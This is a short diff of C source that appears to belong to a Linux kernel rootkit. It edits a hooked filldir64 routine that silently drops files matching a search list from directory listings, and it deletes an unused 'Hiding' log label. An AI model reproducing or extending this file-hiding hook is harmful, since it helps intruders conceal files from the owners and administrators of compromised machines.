@@ -757,12 +757,7 @@ static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,lof
 
     if (fs_search_name(name, ino))
         return 0;
-
     return real_filldir64(ctx, name, namlen, offset, ino, d_type);
-
-match:
-    prinfo("Hiding '%s' from ino=%llu\n", name, ino);
-    return 0;
 }
 
 #define MAXKEY 512
